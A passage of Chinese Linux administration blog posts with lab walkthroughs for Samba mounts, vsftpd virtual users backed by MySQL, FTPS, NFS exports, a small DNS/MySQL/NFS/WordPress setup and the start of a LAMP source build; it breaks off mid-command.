可以使用-U选项来指定用户%密码，或通过设置和导出USER和PASSWD环境变量来指定 挂载samba服务器的共享文件  手动挂载  mount -t cifs -o user=hong,password=passwd //192.168.1.18/shared /mnt/smb  开机自动挂载  $cat /etc/fstab #可以用文件代替用户名和密码的输入 //192.168.1.18/homes /mnt/hong cifs credentials=/etc/user.txt 0 0 $ cat /etc/user.txt username=hong password=password $ chmod 600 /etc/user.txt 多用户samba挂载  CentOS7中可启用多用户挂载功能  客户端挂载samba共享目录后，在客户端登录的不同用户访问同一个samba的挂载点，可获得不同权限\n服务器ip：192.168.1.18\n samba服务器配置  $ yum install samba $ mkdir /multiuser $ vim /etc/samba/smb.conf [smbshare] path=/multiuser writable=no write list= @admins  samba服务器创建samba用户，并添加密码  $ useradd -s /sbin/nologin smb1 $ useradd -s /sbin/nologin -G admins hong $ useradd -s /sbin/nologin -G admins feng $ smbpasswd -a smb1 $ smbpasswd -a hong $ smbpasswd -a feng  samba服务器设置目录权限和SELinux  $ setfacl –m u:wang:rwx /multiuser $ setfacl –m g:admins:rwx /multiuser $ chcon -R -t samba_share_t /multiuser $ systemctl start smb nmb  samba客户端启用多用户挂载  $ yum -y install cifs-utils $ mkdir /mnt/smb $ echo 'username=smb1' \u0026gt;/etc/multiuser $ echo 'password=centos' \u0026gt;\u0026gt;/etc/multiuser $ chmod 600 /etc/multiuser ##以多用户方式挂载： $ vim /etc/fstab //192.168.1.18/smbshare /mnt/smb cifs credentials=/etc/multiuser,multiuser 0 0 $ mount -a  samba客户端启用多用户访问  $ useradd hong $ useradd feng $ su - smb1 #用root访问 $ ls /mnt/smb; touch /mnt/smb/root.txt #用hong访问 $ ls /mnt/smb; touch /mnt/smb/hong.txt $ cifscreds add –u hong 192.168.1.18 $ touch /mnt/smb/hong.txt #用feng访问 $ cifscreds add –u feng 192.168.1.18 $ ls /mnt/smb $ touch /mnt/smb/feng.txt ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-25-samba/","tags":["Linux","samba"],"title":"Samba"},{"categories":["internet"],"contents":"摘要：实现基于mysql验证的vsftpd虚拟用户；实现基于SSL的FTPS.\n实现基于MYSQL验证的vsftpd虚拟用户  安装依赖  yum -y groupinstall \u0026quot;Development Tools\u0026quot; yum -y install mariadb-devel pam-devel vsftpd  获取pam-mysql，编译安装pam模块,并将模块安装到/lib64/security  $ wget http://prdownloads.sourceforge.net/pam-mysql/pam_mysql-0.7RC1.tar.gz $ tar xf pam_mysql-0.7RC1.tar.gz $ cd pam_mysql-0.7RC1/ $ ./configure --help #查看编译的选项帮助 $ ./configure --with-pam-mods-dir=/lib64/security $ make -j 4 \u0026amp;\u0026amp; make install  mysql数据库相关配置，创建名为vsftpd.vsftpd的数据库及数据表，存放虚拟用户的用户名及密码。  $ mysql -uroot -ppasswrod create database vsftpd; use vsftpd show tables; create table vsftpd (id int auto_increment primary key,name char(20),pass char(48)); create table vsftpd (id int auto_increment primary key,name char(20),pass char(48)); desc vsftpd; insert vsftpd(name,pass) values('ftp1',password('centos')), ('ftp2',password('magedu')); select * from vsftpd; grant all on vsftpd.* to vsftpd@'192.168.1.%' identified by 'centos'; flush privileges; $ mysql -uvsftpd -pcentos -h192.168.1.18 #远程链接此mysqlserver，测试是否能进入。  vsftpd配置的相关配置。  建立虚拟用户映射的系统用户及对应的目录，注意：需除去ftp根目录的写权限，如果需要其他目录的权限，可以用acl权限来控制。\n$ useradd -r -d /data/ftp -s /sbin/nologin vuser $ mkdir /data/ftp/{upload,pub} -pv $ chown vuser.vuser /data/ftp $ chmod -w /data/ftp $ setfacl -m u:vuser:rwx /data/ftp/upload/ $ vim /etc/vsftpd/vsftp.conf anonymous_enable=YES guest_enable=YES guest_username=vuser pam_service_name=vsftpd.mysql #原将系统用户无法登录 user_config_dir=/etc/vsftpd/vusers.d/ $ vim /etc/pam.d/vsftpd.mysql #使用pam模块的验证方式，下面有配置说明 auth required pam_mysql.so user=vsftpd passwd=centos host=192.168.1.18 db=vsftpd table=vsftpd usercolumn=name passwdcolumn=pass crypt=2 account required pam_mysql.so user=vsftpd passwd=centos host=192.168.1.18 db=vsftpd table=vsftpd usercolumn=name passwdcolumn=pass crypt=2  pam模块验证方式的配置说明  • auth 表示认证 • account 验证账号密码正常使用 • required 表示认证要通过 • pam_mysql.so模块是默认的相对路径，是相对/lib64/security/路径而言，也可以写绝对路径；后面为给此模块传递的参数 • user=vsftpd为登录mysql的用户 • passwd=centos 登录mysql的的密码 • host=mysqlserver mysql服务器的主机名或ip地址 • db=vsftpd 指定连接msyql的数据库名称 • table=vsftpd 指定连接数据库中的表名 • usercolumn=name 当做用户名的字段,数据库的用户名的表头 • passwdcolumn=pass 当做用户名字段的密码，数据库密码的表头 • crypt=2 密码的加密方式为mysql password()函数加密  启动服务，并远程登录ftp进行测试，并在ftp服务器查询相关日志。  $ service vsftpd start;systemctl start vsftpd $ chkconfig vsftpd on;systemctl enable vsftpd $ tail /var/log/secure Jun 25 21:58:59 localhost polkitd[707]: Unregistered Authentication Agent for unix-process:11468:4172182 (system bus name :1.65, object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8) (disconnected from bus)  远程登录ftp服务器测试,虚拟用户登录为mysql-server里vsftpd.vsftpd的用户及密码。  $ ftp 192.168.1.18 Connected to 192.168.1.18 (192.168.1.18). 220 (vsFTPd 3.0.2) Name (192.168.1.18:root): ftp1 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. 实现基于SSL的FTPS ​\t为了提高安全性，我们有 2 种选择，FTPS： 一种多传输协议，相当于加密版的FTP；SFTP：这个协议使用 SSH 文件传输协议加密从客户机到服务器的 FTP 连接，是一种替代 FTPS 的协议是安全文件传输协议(SFTP)。\n系统：centos7，虚拟机：VMware Workstation14\n抓包工具  安装抓包工具  $ yum install -y wireshark libpcap  配置ssl前，启动服务，先抓包试一试，然后开始用客户端连接 FTP ，发现明文密码和用户。  $ tshark -ni ens33 -R \u0026quot;tcp.dstport eq 21\u0026quot; tshark: -R without -2 is deprecated. For single-pass filtering use -Y. Running as user \u0026quot;root\u0026quot; and group \u0026quot;root\u0026quot;. This could be dangerous. Capturing on 'ens33' 40 9.638793475 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 74 52764 \u0026gt; 21 [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=2995729 TSecr=0 WS=64 42 9.639132045 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52764 \u0026gt; 21 [ACK] Seq=1 Ack=1 Win=14656 Len=0 TSval=2995730 TSecr=11006002 45 9.644326579 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52764 \u0026gt; 21 [ACK] Seq=1 Ack=21 Win=14656 Len=0 TSval=2995733 TSecr=11006005 46 9.644362705 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 72 Request: FEAT 54 9.645159556 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52764 \u0026gt; 21 [ACK] Seq=7 Ack=50 Win=14656 Len=0 TSval=2995736 TSecr=11006007 56 9.645246021 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52764 \u0026gt; 21 [ACK] Seq=7 Ack=78 Win=14656 Len=0 TSval=2995736 TSecr=11006007 57 9.645584396 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 80 Request: OPTS UTF8 ON 59 9.646038469 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 77 Request: USER ftp1 61 9.646830645 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 79 Request: PASS centos 配置FTPS  查看是否支持SSL  $ ldd `which vsftpd` |grep ssl 查看到libssl.so  创建自签名证书  cd /etc/pki/tls/certs/ make vsftpd.pem openssl x509 -in vsftpd.pem -noout –text  配置vsftpd服务支持SSL：/etc/vsftpd/vsftpd.conf  ssl_enable=YES #启用SSL allow_anon_ssl=NO #匿名不支持SSL force_local_logins_ssl=YES #本地用户登录加密 force_local_data_ssl=YES #本地用户数据传输加密 rsa_cert_file=/etc/pki/tls/certs/vsftpd.pem  在客户端进行访问,客户端使用lftp工具。  $lftp ftp1@192.168.1.18 Password: lftp ftp1@192.168.1.18:~\u0026gt; ls drwxrwxr-x 2 0 0 38 Jun 25 14:00 upload lftp ftp1@192.168.1.18:/\u0026gt; cd upload/ lftp ftp1@192.168.1.18:/upload\u0026gt; ls -rw------- 1 996 993 2242 Jun 25 06:28 Makefile  在服务器端进行抓包，已经是加密的了。  $ tshark -ni ens33 -R \u0026quot;tcp.dstport eq 21\u0026quot; tshark: -R without -2 is deprecated. For single-pass filtering use -Y. Running as user \u0026quot;root\u0026quot; and group \u0026quot;root\u0026quot;. This could be dangerous. Capturing on 'ens33' 63 35.579718558 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 74 52762 \u0026gt; 21 [SYN] Seq=0 Win=14600 Len=0 MSS=1460 SACK_PERM=1 TSval=2408883 TSecr=0 WS=64 66 35.580304307 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=1 Ack=1 Win=14656 Len=0 TSval=2408883 TSecr=10417113 68 35.586512644 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=1 Ack=21 Win=14656 Len=0 TSval=2408889 TSecr=10417119 69 35.586526890 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 72 Request: FEAT 76 35.586922917 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=7 Ack=54 Win=14656 Len=0 TSval=2408890 TSecr=10417120 80 35.587063220 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=7 Ack=82 Win=14656 Len=0 TSval=2408890 TSecr=10417120 86 35.587543425 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=7 Ack=133 Win=14656 Len=0 TSval=2408891 TSecr=10417121 87 35.587704732 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 76 Request: AUTH TLS 90 35.627874000 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=17 Ack=164 Win=14656 Len=0 TSval=2408931 TSecr=10417121 91 35.745084236 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 185 Request: \\026\\003\\003\\000r\\001\\000\\000n\\003\\003[1\\350\\036\\344\\023\\030\\a?\\033 93 35.745897710 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=136 Ack=1245 Win=16768 Len=0 TSval=2409049 TSecr=10417279 95 35.752492964 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 345 Request: \\026\\003\\003\\000\\a\\v\\000\\000\\003\\000\\000\\000\\026\\003\\003\\001\\006\\020\\000\\001\\002\\001\\000\\241e\\227\\246\\016\\233\\360b\\204\\215[CWS\\177\\322\\206\u0026amp;u\\270\\336\\356\\331\\3534\\000\\327\\364\\273\\244F\\017\\3163\\016\\335\\b\\313V\\324\\243\\325\\\\363Z\\334{\\341\\337V\\377\\210zR1\\300\\003$\\270\\225\\342 98 35.792069268 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 141 Request: \\024\\003\\003\\000\\001\\001\\026\\003\\003\\000@\\277\\265\\366SZ\\2507(6\\024_n\\357\\266\\373\\247\\234e\\312\\246\\324\\034\\355U\\230\\327~\\002\\235-\\327\\347v\\232p=\\201\\373\\377\\276\\2235{%\\302\\273;\\321\\251\\332\\366S=\\202W\\2048\\271\\353fs\\361\\364\\217 101 35.832569356 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=490 Ack=1320 Win=16768 Len=0 TSval=2409135 TSecr=10417326 102 35.832619179 192.168.1.16 -\u0026gt; 192.168.1.18 FTP 135 Request: \\027\\003\\003\\000@tG\\310\\277\\202)\\266cT\\275\\036\u0026quot;\\026\\260\\225\\311\\a\\223\\266\\236\\250f\\320\\326p\\357g\\a\\307\\224jHX\\315\\036\\253\\377\\251\\276\\224/\\263\\024\\a\\006 , 104 35.833041550 192.168.1.16 -\u0026gt; 192.168.1.18 TCP 66 52762 \u0026gt; 21 [ACK] Seq=559 Ack=1389 Win=16768 Len=0 TSval=2409135 TSecr=10417366 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-25-ftp1/","tags":["Linux","ssh","ftp"],"title":"FTP1"},{"categories":["ops"],"contents":"NFS服务  NFS：Network File System 网络文件系统，基于内核的文件系统。Sun公司开发，通过使用NFS，用户和程序可以像访问本地文件一样访问远端系统上的文件，基于RPC（Remote Procedure Call Protocol远程过程调用）实现 RPC采用C/S模式。客户机请求程序调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。 NFS优势：节省本地存储空间，将常用的数据如：home目录,存放在一台NFS服务器上且可以通过网络访问，那么本地终端将可以减少自身存储空间的使用   软件包：nfs-utils Kernel支持:nfs.ko 端口：2049(nfsd), 其它端口由portmap(111)分配 配置文件：/etc/exports, /etc/exports.d/*.exports CentOS7不支持同一目录同时用nfs和samba共享，因为使用锁机制不同 相关软件包:rpcbind（必须），tcp_wrappers CentOS6开始portmap进程由rpcbind代替 NFS服务主要进程：\n rpc.nfsd 最主要的NFS进程，管理客户端是否可登录 rpc.mountd 挂载和卸载NFS文件系统，包括权限管理 rpc.lockd 非必要，管理文件锁，避免同时写出错 rpc.statd 非必要，检查文件一致性，可修复文件  日志：/var/lib/nfs/   导出的文件系统的格式：/dir 主机1(opt1,opt2) 主机2(opt1,opt2)\u0026hellip; #开始为注释 主机格式：  单个主机：ipv4，ipv6，FQDN IP networks：两种掩码格式均支持 172.18.0.0/255.255.0.0 172.18.0.0/16 wildcards：主机名通配，例如*.magedu.com，IP不可以 netgroups：NIS域的主机组，@group_name anonymous：表示使用*通配所有客户端 每个条目指定目录导出到的哪些主机，及相关的权限和选项\n默认选项：(ro,sync,root_squash,no_all_squash) ro,rw 只读和读写 async 异步，数据变化后不立即写磁盘，性能高 sync（1.0.0后为默认）同步，数据在请求时立即写入共享 no_all_squash （默认）保留共享文件的UID和GID all_squash 所有远程用户(包括root)都变成nfsnobody root_squash （默认）远程root映射为nfsnobody,UID为65534，早期版本是4294967294 (nfsnobody) no_root_squash 远程root映射成root用户 anonuid和anongid 指明匿名用户映射为特定用户UID和组GID，而非 nfsnobody,可配合all_squash使用 操作性实验  exportfs专门管理nfs系统，/etc/exports安装系统时自带，由setup包提供。  $rpm -qf /etc/exports setup-2.8.14-23.el6.noarch $sytemtcl restart nfs-server $ vim /etc/exports /app/nfsdir1 * /app/nfsdir2 *(rw) $exportfs -f $exportfs -v /app/nfsdir1 \u0026lt;world\u0026gt;(ro,sync,wdelay,hide,no_subtree_check,sec=sys,secure,root_squash,no_all_squash) /app/nfsdir2 \u0026lt;world\u0026gt;(rw,sync,wdelay,hide,no_subtree_check,sec=sys,secure,root_squash,no_all_squash)  服务授权  setfacl -m u:nfsnobody:rwx /app/nfsdir2 #授权远程的root账户。 setfacl -m u:65534:rwx /app/nfsdir2  远程挂载  }# yum install nfs-utils -y $ showmount -e 192.168.1.18 Export list for 192.168.1.18: /app/nfsdir1 * /app/nfsdir2 192.168.1.16 $ mount 192.168.1.18:/ /mnt/nfs1/ 实现基于NFS文件共享的架构共享。 实现如下拓扑图：\n场景： 客户端访问www.hongfeng.io,会向DNSserver询问ip，然后DNSserver返回域名的IP，然后才能访问web服务器的资源。web服务器的资源比如wordpress存于NFS-server上，数据管理存于mysql后台数据库服务器上。实现了一个简单httpd+DNS+mysql+nfs服务架构。\n试验准备：\nhostnamectl set-hostname DNSserver 基于centos6和centos7搭建。\n--------------------------------------- centos6：2.6.32-696.el6.x86_64 client：172.20.114.144\tDNSserver：172.20.114.139 mysql: 172.20.114.145 web+phpserever: 172.20.114.146 172.20.114.147 实现小的均衡负载，但是这种DNS解析的辅助均衡并不可靠，不过有更专业的lvs,haproxy还以nginx都可以实现。 --------------------------------------- centos7: 3.10.0-862.el7.x86_64 NFSserver: 172.20.5.24 DNS-server的搭建 DNS的主机IP为172.20.114.139，配置DNS服务器，需要首先下载bind包，然后再配置/etc/named.conf文件，允许本地和其他人访问；其次，增加需要解析的zone文件，在/etc/named.rfc1912.zones配置，注意zone是域名，不用带www；最后是/var/named/*.zone资源配置文件；**注意 **，需要改变新增的zone资源配置文件的所属组；启动服务。具体配置如下：\n$ yum -y install bind $ vim /etc/named.conf options { //\tlisten-on port 53 { 127.0.0.1; }; //\tallow-query { localhost; }; ··· $ vim /etc/named.rfc1912.zones zone \u0026quot;hongfeng.io\u0026quot; IN { type master; file \u0026quot;named.hongfeng.zone\u0026quot;; }; $ vim /var/named/named.hongfeng.zone $TTL 1D @\tIN SOA\tdns.hongfeng.io. admin.hongfeng.io. ( 0\t; serial 1D\t; refresh 1H\t; retry 1W\t; expire 3H )\t; minimum NS\tdns.hongfeng.io. dns\tA\t172.20.114.139 web\tA\t172.20.114.147 web\tA\t172.20.114.146 www\tCNAME\tweb $ chgrp named /var/named/named.hongfeng.zone $ systemctl start named mysql服务器的搭建 试验的mysql服务器ip为172.20.114.145。首先安装mysql-server，再创建数据库及授权服务器的数据库管理。注意，这里授权的是给web+php服务器，虽然wordpress存于NFS服务器上，但是用户访问的时候，*.php的文件都会转发给PHP程序来解析，所以，wordpress的数据库授权应该给web+php服务器.\n$ yum install mysql-server -y $ service mysqld start $ chkconfig mysqld on $ mysql create database wpdb; use wpdb; grant all on wpdb.* to wpuser@'172.20.114.147' identified by 'centos'; grant all on wpdb.* to wpuser@'172.20.114.146' identified by 'centos'; flush privileges; NFS服务器的搭建 试验的NFS服务器ip为172.20.5.24，这里是存放数据的服务器，先下载wordpress资源，建立资源存放文件比如/data/,将\n$ [ -f wordpress-4.9.4-zh_CN.tar.gz ] || wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz $ [ -d /data ] || mkdir /data $ tar xf wordpress-4.9.4-zh_CN.tar.gz -C /data/ $ cd /data/wordpress $ cp wp-config-sample.php wp-config.php $ sed -i \u0026quot;s/database_name_here/wpdb/\u0026quot; wp-config.php $ sed -i \u0026quot;s/username_here/wpuser/\u0026quot; wp-config.php $ sed -i \u0026quot;s/password_here/centos/\u0026quot; wp-config.php $ sed -i \u0026quot;s/localhost/172.20.114.145/\u0026quot; wp-config.php $ yum install nfs-utils -y $ vim /etc/exports /data/wordpress 172.20.114.146(rw) 172.20.114.147(rw) $ systemctl start nfs-server web1+php和web2+php主机的搭建 这两台的试验主机的IP分别为：172.20.114.14[6,7],安装相关服务，挂载NFS服务器资源即可。\n$ yum install -y httpd php php-mysql nfs-utils $ service httpd start $ showmount -e 172.20.5.24 $ mount 172.20.5.24:/data/wordpress /var/www/html client的设置及访问 $ vim /etc/resolv.conf nameserver 172.20.114.139 $ dig www.hongfeng.io ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.9.4-RedHat-9.9.4-61.el7 \u0026lt;\u0026lt;\u0026gt;\u0026gt; www.hongfeng.io ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 31025 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 1, ADDITIONAL: 2 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;www.hongfeng.io.\tIN\tA ;; ANSWER SECTION: www.hongfeng.io.\t86400\tIN\tCNAME\tweb.hongfeng.io. web.hongfeng.io.\t86400\tIN\tA\t172.20.114.147 web.hongfeng.io.\t86400\tIN\tA\t172.20.114.146 ;; AUTHORITY SECTION: hongfeng.io.\t86400\tIN\tNS\tdns.hongfeng.io. ;; ADDITIONAL SECTION: dns.hongfeng.io.\t86400\tIN\tA\t172.20.114.139 ;; Query time: 1 msec ;; SERVER: 172.20.114.139#53(172.20.114.139) ;; WHEN: Tue Jun 26 14:09:51 CST 2018 ;; MSG SIZE rcvd: 128 结语： ​\t出现配置好的A记录及CNAME记录,说明DNS解析完成，现在开始访问http://www.hongfeng.io/,实现了均衡负载。并且搭建了NFS文件服务器和mysql数据库服务器。一个简简单单的小架构搭建完毕。\n​\t几台服务器构成了一个算是小小的架构，是一个小实验，综合理解了DNS，NFS，httpd，php等程序的运作。\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-25-nfs/","tags":["Linux","nfs"],"title":"nfs 详解"},{"categories":["internet"],"contents":"摘要：FTP的简介；vsftpd的相关应用；实现基于文件验证的vsftpd虚拟用户\nFTP介绍  File Transfer Protocol 早期的三个应用级协议之一  应用级协议：http smtp ftp\n  基于C/S结构\n  双通道协议：数据和命令连接\n  数据传输格式：二进制（默认）和文本\n  两种模式：服务器角度\n   主动(PORT style)：服务器主动连接，通过command告诉服务器数据端口  命令（command）：客户端：随机port --- 服务器：tcp21 数据：客户端：随机port ---服务器：tcp20 被动(PASV style)：客户端主动连接，通过command告诉客户端数据端口  命令（控制）：客户端：随机port --- 服务器：tcp21 数据：客户端：随机port ---服务器：随机port  服务器被动模式数据端口示例：  ftp\u0026gt; ls 227 Entering Passive Mode (172,20,0,1,44,250). 150 Here comes the directory listing. drwxr-xr-x 21 0 0 4096 Apr 09 10:44 pub 服务器数据端口为：44*256+250  状态码  1XX：信息 125：数据连接打开 2XX：成功类状态 200：命令OK 230：登录成功 3XX：补充类 331：用户名OK 4XX：客户端错误 425：不能打开数据连接 5XX：服务器错误 530：不能登录  用户认证：  匿名用户：ftp,anonymous,对应Linux用户ftp 系统用户：Linux用户,用户/etc/passwd,密码/etc/shadow 虚拟用户：特定服务的专用用户，独立的用户/密码文件 nsswitch:network service switch 名称解析框架 pam:pluggable authentication module 用户认证 /lib64/security /etc/pam.d/ /etc/pam.conf vsftpd  由vsftpd包提供 不再由xinetd管理 用户认证配置文件:/etc/pam.d/vsftpd 服务脚本： /usr/lib/systemd/system/vsftpd.service /etc/rc.d/init.d/vsftpd 配置文件:/etc/vsftpd/vsftpd.conf man 5 vsftpd.conf 格式：option=value 注意：= 前后不要有空格 匿名用户（映射为系统用户ftp ）共享文件位置：/var/ftp 系统用户共享文件位置：用户家目录 虚拟用户共享文件位置：为其映射的系统用户的家目录\n  被动模式端口范围，只允许10个端口打开。  ftp_data_port=2020 pasv_min_port=6000 0为随机分配 pasv_max_port=6010 use_local_time  匿名用户  anonymous_enable=YES 支持匿名用户 no_anon_password=YES anon_world_readable_only 只能下载全部读的文件 #给ftp上传修改权限 anon_upload_enable=YES 匿名上传，注意:文件系统权限setfacl -m u:ftp:rwx /vat/ftp/pup anon_mkdir_write_enable=YES anon_umask=077 指定匿名上传文件的umask anon_other_write_enable=YES 可删除和修改上传的文件 #指定上传文件的默认的所有者和权限 chown_uploads=YES(默认NO) chown_username=wang chown_upload_mode=0644  系统用户的设置  guest_enable=YES #所有系统用户都映射成guest用户 guest_username=ftp #配合上面选项才生效，指定guest用户， local_enable=YES #是否允许linux用户登录 write_enable-YES #允许linux用户上传文件 local_umask=022 #指定系统用户上传文件的默认权限 local_root=/ftproot #非匿名用户登录所在目录。 ##禁锢所有系统用户在家目录中 chroot_local_user=YES #（默认NO，不禁锢）禁锢系统用户 ##禁锢或不禁锢特定的系统用户在家目录中，与上面设置功能相反 chroot_list_enable=YES chroot_list_file=/etc/vsftpd/chroot_list #当chroot_local_user=YES时，则chroot_list中用户不禁锢 #当chroot_local_user=NO时，则chroot_list中用户禁锢  wu-ftp日志：默认启用  xferlog_enable=YES （默认）启用记录上传下载日志 xferlog_std_format=YES （默认）使用wu-ftp日志格式 xferlog_file=/var/log/xferlog （默认）可自动生成  vsftpd日志：默认不启用  dual_log_enable=YES 使用vsftpd日志格式，默认不启用 vsftpd_log_file=/var/log/vsftpd.log（默认）可自动生成  登录提示信息  ftpd_banner=\u0026quot;welcome to mage ftp server\u0026quot; banner_file=/etc/vsftpd/ftpbanner.txt 优先上面项生效 ^[[1;5;32mwelcome to my ftp server^[[0m  目录访问提示信息  dirmessage_enable=YES (默认) message_file=.message(默认)信息存放在指定目录下.message  pam模块  使用pam(Pluggable Authentication Modules)完成用户认证 pam_service_name=vsftpd pam配置文件:/etc/pam.d/vsftpd /etc/vsftpd/ftpusers 默认文件中用户拒绝登录 是否启用控制用户登录的列表文件 userlist_enable=YES 默认有此设置 userlist_deny=YES(默认值)黑名单,不提示口令，NO为白名单 userlist_file=/etc/vsftpd/users_list 此为默认值 连接限制 max_clients=0 最大并发连接数 max_per_ip=0 每个IP同时发起的最大连接数 vsftpd服务指定用户身份运行 nopriv_user=nobody 实现基于文件验证的vsftpd虚拟用户  创建虚拟用户文件，以后远程登录ftp服务器的用户及密码保存文件点。  $ cd /etc/vsftpd/ $ cp vsftpd.conf vsftpd.conf.bak $ vim vsftpusers ftpuser1 centos ftpuser2 hong ftpuser3 rhel $ db_load -T -t hash -f vsftpusers vsftpusers.db $ file vsftpusers.db $ chmod 600 vsftpusers  创建系统的虚拟用户，远程登录用户映射成为系统虚拟用户。  $ useradd -r -d /data/ftp -s /sbin/nologin vuser $ mkdir /data/ftp/upload $ chown -R vuser.vuser /data/ftp $ setfacl -m u:vuser:rwx upload/ $ chmod -w /data/ftp  配置vsftpd服务器，有pam模块认证，有授权映射虚拟用户。设置不同虚拟用户对应的相应配置文件不同，ftpuser1实现能上传文件，ftpuser2实现家目录为/ftproot。  $ vim /etc/pam.d/vsftpd.db auth required pam_userdb.so db=/etc/vsftpd/vsftpusers account required pam_userdb.so db=/etc/vsftpd/vsftpusers $ vim /etc/vsftpd/vsftp.conf guest_enable=YES guest_username=vuser pam_service_name=vsftpd.db user_config_dir=/etc/vsftpd/vusers.d/ $ mkdir vusers.d $ vim vusers.d/ftpuser1 anon_upload_enable=YES anon_mkdir_write_enable=YES anon_other_write_enable=YES $ vim vusers.d/ftp2 local_root=/ftproot $ mkdir /ftproot $ touch /ftproot/test $ systemctl restart vsftpd  进行试验,远程链接ftp服务器，以ftpuser1登录，能上传文件，以ftpuser2登录，家目录为/ftproot。  $ftp 192.168.1.18 Connected to 192.168.1.18 (192.168.1.18). 220 (vsFTPd 3.0.2) Name (192.168.1.18:root): ftpuser1 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026quot;/\u0026quot; ftp\u0026gt; cd upload 250 Directory successfully changed. ftp\u0026gt; pwd 257 \u0026quot;/upload\u0026quot; ftp\u0026gt; !ls ca-bundle.crt ca-bundle.trust.crt make-dummy-cert Makefile renew-dummy-cert ftp\u0026gt; put Makefile local: Makefile remote: Makefile 227 Entering Passive Mode (192,168,1,18,101,13). 150 Ok to send data. 226 Transfer complete. $ftp 192.168.1.18 Connected to 192.168.1.18 (192.168.1.18). 220 (vsFTPd 3.0.2) Name (192.168.1.18:root): ftpuser2 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026quot;/\u0026quot; ftp\u0026gt; cd upload 250 Directory successfully changed. ftp\u0026gt; ls 227 Entering Passive Mode (192,168,1,18,66,111). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 0 Jun 25 06:31 test 226 Directory send OK. ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-24-ftp/","tags":["Linux","ftp"],"title":"FTP"},{"categories":["Http"],"contents":"摘要：centos7编译安装lamp；实现多虚拟主机wordpress，discuz；一键编译安装lamp脚本\ncentos7 编译安装lamp 源码获取 $ wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-1.6.3.tar.gz $ wget http://mirrors.tuna.tsinghua.edu.cn/apache//apr/apr-util-1.6.1.tar.gz $ wget https://archive.apache.org/dist/httpd/httpd-2.4.33.tar.bz2 $ wget http://mirrors.sohu.com/php/php-7.1.18.tar.bz2 $ wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz $ wget http://download.comsenz.com/DiscuzX/3.3/Discuz_X3.3_SC_UTF8.zip $ wget ftp://172.20.0.1/pub/Sources/sources/mariadb/mariadb-10.2.15-linux-x86_64.tar.gz 相关依赖安装 #包组依赖 yum groupinstall 'Development Tools' #httpd依赖 yum install pcre-devel apr-devel apr-util-devel openssl-devel -y #php依赖 yum install libxml2-devel bzip2-devel libmcrypt-devel -y 编译安装httpd $ tar xf apr-1.6.3.tar.gz $ tar xf apr-util-1.6.1.tar.gz $ tar xf httpd-2.4.33.tar.bz2 $ mv apr-1.6.3 httpd-2.4.33/srclib/apr $ mv apr-util-1.6.1 httpd-2.4.33/srclib/apr-util/ $ ./configure --prefix=/app/httpd24 \\ --enable-so \\ --enable-ssl \\ --enable-cgi \\ --enable-rewrite \\ --with-zlib \\ --with-pcre \\ --with-included-apr \\ --enable-modules=most \\ --enable-mpms-shared=all \\ --with-mpm=prefork $ make -j4 \u0026amp;\u0026amp; make install mariadb二进制安装 可以参考博主前面mysql博文，数据库的路径规划为/data/mysqld。\n$ id mysql \u0026amp;\u0026gt; /dev/null || useradd -r -d /data/mysqldb -s /sbin/nologin mysql $ mkdir /data/mysqldb -pv \u0026amp;\u0026amp; chown mysql.mysql /data/mysqldb \u0026amp;\u0026amp; chmod 770 /data/mysqldb $ tar xf mariadb-10.2.15-linux-x86_64.tar.gz -C /usr/local $ cd /usr/local $ ln -s mariadb-10.2.15-linux-x86_64/ mysql \u0026amp;\u0026amp; chown -R root:mysql 